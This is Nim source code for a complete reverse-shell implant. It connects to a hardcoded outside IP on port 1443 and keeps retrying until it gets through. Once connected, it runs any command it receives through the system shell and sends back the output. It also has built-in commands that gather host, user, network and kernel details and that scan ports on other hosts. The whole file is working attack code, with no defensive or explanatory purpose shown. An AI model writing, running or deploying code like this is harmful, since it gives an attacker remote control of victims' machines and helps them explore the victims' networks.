import net
import os
import osproc
import strutils
import sequtils

# Default connection parameters for the reverse shell, customizable via command-line arguments
var ip = "16.16.197.51"
var port = 1443

# Command-line arguments
var args = commandLineParams()

# If arguments are provided, use them to overwrite the default IP and port
if args.len() == 2:
    ip = args[0]
    port = parseInt(args[1])

# Function to get the system's shell based on the OS
proc getShell(): string =
    when defined(windows):
        "cmd /c "
    else:
        "/bin/sh -c "

# Function to execute a command and return its output
proc executeCommand(cmd: string): string =
    try:
        let result = execProcess(getShell() & cmd)  # Execute the command and store the result
        return result  # Return the result
    except OSError as e:
        return "Error: " & e.msg  # Return the error message if the command fails

# Function to gather system information (hostname, OS, CPU info)
proc gatherSystemInfo(): string =
    var info = ""
    info.add("Hostname: " & getEnv("COMPUTERNAME"))  # For Windows
    info.add("\nOS: " & getEnv("OS"))  # For Windows
    info.add("\nCPU Info: " & execProcess("lscpu"))  # For Linux-based systems
    info.add("\nUSERNAME: " & execProcess("whoami"))
    info.add("\nID Info: " & execProcess("id"))
    info.add("\nNETWORK Info: " & execProcess("ip a"))
    info.add("\nHOST Info: " & execProcess("hostname"))
    info.add("\nKERNEL Version: " & execProcess("uname -a"))
    return info

# Function to scan ports
proc scanPorts(target: string): string =
    var result = ""
    for port in 20..1024:  # Range of ports to scan
        let socket = newSocket()
        try:
            socket.connect(target, Port(port))
            result.add("Port " & $port & " is open\n")
        except:
            continue
    return result

# Main function for reverse shell
proc reverseShell() =
    let socket = newSocket()
    echo "Attempting to connect to ", ip, " on port ", port, "..."
    while true:
        try:
            socket.connect(ip, Port(port))
            echo "Connected!"
            while true:
                socket.send("> ")
                let cmd = socket.recvLine().strip()
                if cmd == "exit":
                    socket.close()
                    quit()
                elif cmd == "sysinfo":
                    let sysInfo = gatherSystemInfo()
                    socket.send(sysInfo)
                elif cmd.startsWith("scan "):
                    let target = cmd.splitWhitespace()[1]
                    let scanResult = scanPorts(target)
                    socket.send(scanResult)
                else:
                    let result = executeCommand(cmd)
                    socket.send(result & "\n")
        except:
            echo "Connection failed, retrying in 10 seconds..."
            sleep(10000)

# Start the reverse shell
reverseShell()

